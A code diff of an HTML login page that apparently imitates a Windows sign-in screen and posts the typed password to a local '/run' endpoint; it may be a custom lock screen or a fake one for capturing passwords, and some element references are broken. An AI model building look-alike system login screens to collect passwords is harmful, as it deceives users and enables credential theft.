@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -10,7 +11,6 @@
     input::-ms-clear {
       display: none;
     }
-
     input[type="password"]::-webkit-credentials-auto-fill-button,
     input[type="password"]::-webkit-inner-spin-button,
     input[type="password"]::-webkit-clear-button,
@@ -22,44 +22,49 @@
 </head>
 <body>
   <section class="login flex-col-center bg-gradient-to-br from-[#0f172a] to-[#1e293b] min-h-screen px-4">
-    <div class="w-32 h-32 bg-white/10 bg-opacity-20 rounded-full flex items-center justify-center z-[999]">
-      <img src="user.webp" alt="User" class="w-1/2 h-1/2 md:w-full xsm:h-full object-contain" />
-    </div>
-
-    <h2 id="userTitle" class="text-[20px] font-semibold text-white z-[999] pb-5 pt-2 text-center"></h2>
-
-    <div class="login-wrapper z-[999] px-[2px] w-full max-w-[200px]">
-      <div id="password_area" class="flex items-center relative max-w-[200px] backdrop-blur-md bg-[#161B36] rounded-[3px] overflow-hidden border-b-[1.7px] border-b-[#0078D4]">
-        <div class="flex-row-center w-full">
-          <input 
-            id="password" 
-            type="password" 
-            placeholder="Password" 
-            class="w-full text-xs px-[5px] py-1 text-gray-300 outline-none placeholder:text-gray-300"
-            autofocus 
-          />
-          <a onclick="pass_check()">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-3 h-3 text-gray-200 absolute right-1 top-1/2 -translate-y-1/2">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 4.5 21 12m0 0-7.5 7.5M21 12H3" />
-            </svg>
-          </a>
-
-          <button type="button" class="outline-none text-gray-200 text-sm absolute right-5 px-1" onclick="togglePassword()">
-            <svg id="eye" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-3 h-3">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322...Z" />
-              <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 1 1-6 0..." />
-            </svg>
-            <svg id="eye-off" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-3 h-3 hidden">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223...Z" />
-            </svg>
-          </button>
-        </div>
+    <div class="z-[999] w-[255px] flex-col-center">
+      <div class="w-44 h-44 bg-white/10 bg-opacity-20 rounded-full flex items-center justify-center z-[999]">
+        <img  src="http://localhost:12345/user.webp"  class="w-1/2 h-1/2 md:w-full xsm:h-full object-contain rounded-full" />
       </div>
 
-      <a id="reset_password" class="text-gray-300 mx-auto block text-center text-xs mt-5 hover:text-white transition-all duration-100 hidden">Reset password</a>
-      <a id="password_msg_text" class="text-gray-300 mx-auto block text-center text-xs mt-5 hover:text-white transition-all duration-100 hidden">The password is incorrect. Try again.</a>
-      <div id="password_msg_button" class="hidden w-full flex-row-center py-5" onclick="re_try()">
-        <button type="button" class="text-xs mx-auto text-gray-200 border-2 border-gray-200 bg-white/20 rounded-lg px-11 py-[6px]">OK</button>
+      <h2 id="userTitle" class="text-[20px] font-semibold text-white z-[999] pb-5 pt-2 text-center"></h2>
+      
+      <div class="login-wrapper z-[999] px-[2px] w-full">
+        <form class="flex items-center relative backdrop-blur-md bg-[#161B36] rounded-[3px] overflow-hidden border-b-[1.7px] border-b-[#0078D4]">
+          <div class="flex-row-center w-full px-2">
+            <input 
+              id="password" 
+              type="password" 
+              placeholder="Password" 
+              class="w-full text-xs px-[3px] py-2 text-gray-300 outline-none placeholder:text-gray-300" 
+              autofocus 
+            />
+            <a href="#" onclick="pass_check()" class="hover:bg-[#0078D4] p-1 rounded-xs block">
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 text-gray-200">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 4.5 21 12m0 0-7.5 7.5M21 12H3" />
+              </svg>
+            </a>
+
+            <button type="button" class="outline-none hover:bg-gray-100/10 p-1 rounded-xs text-gray-200 text-sm absolute right-7 hover:cursor-pointer flex-row-center px-1 mr-3" onclick="togglePassword()">
+
+              <svg data-testid="password-eye-on" fill="currentColor" class="___12fm75w f1w7gpdv fez10in fg4l7m0" aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+                <path d="M3.26 11.6A6.97 6.97 0 0 1 10 6c3.2 0 6.06 2.33 6.74 5.6a.5.5 0 0 0 .98-.2A7.97 7.97 0 0 0 10 5a7.97 7.97 0 0 0-7.72 6.4.5.5 0 0 0 .98.2ZM10 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7Zm-2.5 3.5a2.5 2.5 0 1 1 5 0 2.5 2.5 0 0 1-5 0Z" fill="currentColor"></path>
+              </svg>
+                        
+
+              <svg id="eye-off" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-4 h-4 hidden">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88"></path>
+              </svg>
+            </button>
+          </div>
+        </form>
+        
+
+        <a id="reset_password" href="#" class="text-gray-300 mx-auto block text-center text-xs mt-5 hover:text-white transition-all duration-100 hidden">Reset password</a>
+        <a id="password_msg_text" class="hidden text-gray-300 mx-auto block text-center text-xs mt-5 hover:text-white transition-all duration-100">The password is incorrect. Try again.</a>
+        <div id="password_msg_button" class="hidden w-full flex-row-center py-5" onclick="re_try()">
+          <button type="button" class="text-xs mx-auto text-gray-200 border-2 border-gray-200 bg-white/20 rounded-lg px-11 py-[6px]">OK</button>
+        </div>
       </div>
     </div>
   </section>
@@ -69,34 +74,62 @@
     const toggleButton = document.querySelector('button[onclick="togglePassword()"]');
     let status = "0";
 
-    // Fetch current user name
     window.addEventListener("DOMContentLoaded", () => {
       fetch("/user")
         .then(res => res.text())
         .then(name => {
           document.getElementById("userTitle").textContent = name;
         });
-
+        fetch("/user.webp")
+        .then(res => res.text())
+        .then(name => {
+          document.getElementById("userwebp").textContent = name;
+        });
       toggleButton.classList.add("hidden");
       passwordInput.focus();
     });
 
-    // Toggle password show/hide
-    function togglePassword() {
-      const eye = document.getElementById("eye");
-      const eyeOff = document.getElementById("eye-off");
-      const type = passwordInput.type === "password" ? "text" : "password";
-      passwordInput.type = type;
-      eye.classList.toggle("hidden", type === "text");
-      eyeOff.classList.toggle("hidden", type === "password");
-    }
-
-    // Show/hide toggle eye button on input
     passwordInput.addEventListener("input", () => {
       toggleButton.classList.toggle("hidden", passwordInput.value.length === 0);
     });
 
-    // Enter key toggle logic
+    function togglePassword() {
+      const eye = document.getElementById("eye");
+      const eyeOff = document.getElementById("eye-off");
+
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+      } else {
+        passwordInput.type = "password";
+      }
+    }
+
+    function pass_check() {
+      const password = passwordInput.value;
+
+      fetch("/run", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "password=" + encodeURIComponent(password)
+      })
+      .then(res => res.text())
+      .then(result => {
+        if (result === "OK") {
+          alert('Access Granted');
+        } else {
+          document.getElementById('password_msg_text').style.display = "block";
+          document.querySelector("form").style.display = "none";
+          document.getElementById('password_msg_button').style.display = "flex";
+        }
+      });
+    }
+
+    function re_try() {
+      document.querySelector("form").style.display = "flex";
+      document.getElementById('password_msg_text').style.display = "none";
+      document.getElementById('password_msg_button').style.display = "none";
+    }
+
     document.addEventListener("keydown", (e) => {
       if (e.key === "Enter") {
         e.preventDefault();
@@ -114,34 +147,6 @@
         }
       }
     });
-
-    // Reset UI
-    function re_try() {
-      document.getElementById('password_area').style.display = "block";
-      document.getElementById('password_msg_text').style.display = "none";
-      document.getElementById('password_msg_button').style.display = "none";
-    }
-
-    // Validate password
-    function pass_check() {
-      const password = passwordInput.value;
-
-      fetch("/run", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: "password=" + encodeURIComponent(password)
-      })
-      .then(res => res.text())
-      .then(result => {
-        if (result === "OK") {
-          alert('Access Granted')
-        } else {
-          document.getElementById('password_msg_text').style.display = "block";
-          document.getElementById('password_area').style.display = "none";
-          document.getElementById('password_msg_button').style.display = "block";
-        }
-      });
-    }
   </script>
 </body>
 </html>
